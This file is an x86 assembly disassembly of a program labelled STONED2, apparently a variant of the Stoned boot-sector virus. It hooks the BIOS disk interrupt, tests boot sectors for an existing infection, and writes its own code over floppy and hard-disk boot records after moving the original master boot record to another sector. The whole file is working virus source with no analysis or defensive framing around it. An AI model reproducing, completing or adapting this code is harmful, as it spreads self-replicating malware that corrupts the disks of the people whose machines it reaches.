  
PAGE  60,132
  
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        STONED2				         лл
;лл								         лл
;лл      Created:   1-Jan-80					         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
DATA_1E		EQU	8				; (694B:0008=0)
DATA_2E		EQU	9				; (694B:0009=0)
DATA_3E		EQU	11H				; (694B:0011=0)
  
CODE_SEG_A	SEGMENT
		ASSUME	CS:CODE_SEG_A, DS:CODE_SEG_A
  
  
		ORG	100h
  
stoned2		PROC	FAR
  
start:
		DB	31488 DUP (0)
		DB	0EAH, 5, 0, 0C0H, 7, 0E9H
		DB	99H, 0, 0, 11H, 99H, 0
		DB	0F0H, 0E4H, 0, 80H, 9FH, 0
		DB	7CH, 0, 0, 1EH, 50H, 80H
		DB	0FCH, 2, 72H, 17H, 80H, 0FCH
		DB	4, 73H, 12H, 0AH, 0D2H, 75H
		DB	0EH, 33H, 0C0H, 8EH, 0D8H, 0A0H
		DB	3FH, 4, 0A8H, 1, 75H, 3
		DB	0E8H, 7, 0, 58H, 1FH, 2EH
		DB	0FFH, 2EH, 9, 0, 53H, 51H
		DB	52H, 6, 56H, 57H, 0BEH, 4
		DB	0
LOC_1:
		MOV	AX,201H
		PUSH	CS
		POP	ES
		MOV	BX,200H
		XOR	CX,CX				; Zero register
		MOV	DX,CX
		INC	CX
		PUSHF					; Push flags
		CALL	DWORD PTR CS:DATA_2E		; (694B:0009=0)
		JNC	LOC_2				; Jump if carry=0
		XOR	AX,AX				; Zero register
		PUSHF					; Push flags
		CALL	DWORD PTR CS:DATA_2E		; (694B:0009=0)
		DEC	SI
		JNZ	LOC_1				; Jump if not zero
		JMP	SHORT LOC_4
		DB	90H
LOC_2:
		XOR	SI,SI				; Zero register
		MOV	DI,200H
		CLD					; Clear direction
		PUSH	CS
		POP	DS
		LODSW					; String [si] to ax
		CMP	AX,[DI]
		JNE	LOC_3				; Jump if not equal
		LODSW					; String [si] to ax
		CMP	AX,[DI+2]
		JE	LOC_4				; Jump if equal
LOC_3:
		MOV	AX,301H
		MOV	BX,200H
		MOV	CL,3
		MOV	DH,1
		PUSHF					; Push flags
		CALL	DWORD PTR CS:DATA_2E		; (694B:0009=0)
		JC	LOC_4				; Jump if carry Set
		MOV	AX,301H
		XOR	BX,BX				; Zero register
		MOV	CL,1
		XOR	DX,DX				; Zero register
		PUSHF					; Push flags
		CALL	DWORD PTR CS:DATA_2E		; (694B:0009=0)
LOC_4:
		POP	DI
		POP	SI
		POP	ES
		POP	DX
		POP	CX
		POP	BX
		RET
		DB	33H, 0C0H, 8EH, 0D8H, 0FAH, 8EH
		DB	0D0H, 0BCH, 0, 7CH, 0FBH, 0A1H
		DB	4CH, 0, 0A3H, 9, 7CH, 0A1H
		DB	4EH, 0, 0A3H, 0BH, 7CH, 0A1H
		DB	13H, 4, 48H, 48H, 0A3H, 13H
		DB	4, 0B1H, 6, 0D3H, 0E0H, 8EH
		DB	0C0H, 0A3H, 0FH, 7CH, 0B8H, 15H
		DB	0, 0A3H, 4CH, 0, 8CH, 6
		DB	4EH, 0, 0B9H, 0B8H, 1, 0EH
		DB	1FH, 33H, 0F6H, 8BH, 0FEH, 0FCH
		DB	0F3H, 0A4H, 2EH, 0FFH, 2EH, 0DH
		DB	0, 0B8H, 0, 0, 0CDH, 13H
		DB	33H, 0C0H, 8EH, 0C0H, 0B8H, 1
		DB	2, 0BBH, 0, 7CH, 2EH, 80H
		DB	3EH, 8, 0, 0, 74H, 0BH
		DB	0B9H, 7, 0, 0BAH, 80H, 0
		DB	0CDH, 13H, 0EBH, 49H, 90H, 0B9H
		DB	3, 0, 0BAH, 0, 1, 0CDH
		DB	13H, 72H, 3EH, 26H, 0F6H, 6
		DB	6CH, 4, 7, 75H, 12H, 0BEH
		DB	89H, 1, 0EH, 1FH
LOC_5:
		LODSB					; String [si] to al
		OR	AL,AL				; Zero ?
		JZ	LOC_6				; Jump if zero
		MOV	AH,0EH
		MOV	BH,0
		INT	10H				; Video display   ah=functn 0Eh
							;  write char al, teletype mode
		JMP	SHORT LOC_5
LOC_6:
		PUSH	CS
		POP	ES
		MOV	AX,201H
		MOV	BX,200H
		MOV	CL,1
		MOV	DX,80H
		INT	13H				; Disk  dl=drive a: ah=func 02h
							;  read sectors to memory es:bx
		JC	LOC_7				; Jump if carry Set
		PUSH	CS
		POP	DS
		MOV	SI,200H
		MOV	DI,0
		LODSW					; String [si] to ax
		CMP	AX,[DI]
		JNE	LOC_8				; Jump if not equal
		LODSW					; String [si] to ax
		CMP	AX,[DI+2]
		JNE	LOC_8				; Jump if not equal
LOC_7:
		MOV	BYTE PTR CS:DATA_1E,0		; (694B:0008=0)
		JMP	DWORD PTR CS:DATA_3E		; (694B:0011=0)
LOC_8:
		MOV	BYTE PTR CS:DATA_1E,2		; (694B:0008=0)
		MOV	AX,301H
		MOV	BX,200H
		MOV	CX,7
		MOV	DX,80H
		INT	13H				; Disk  dl=drive a: ah=func 03h
							;  write sectors from mem es:bx
		JC	LOC_7				; Jump if carry Set
		PUSH	CS
		POP	DS
		PUSH	CS
		POP	ES
		MOV	SI,3BEH
		MOV	DI,1BEH
		MOV	CX,242H
		REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
		MOV	AX,301H
		XOR	BX,BX				; Zero register
		INC	CL
		INT	13H				; Disk  dl=drive a: ah=func 03h
							;  write sectors from mem es:bx
		JMP	SHORT LOC_7
		DB	7
		DB	35 DUP (0)
		DB	67H, 2, 6, 67H, 2, 67H
		DB	2, 0BH, 3, 67H, 2
  
stoned2		ENDP
  
CODE_SEG_A	ENDS
  
  
  
		END	START
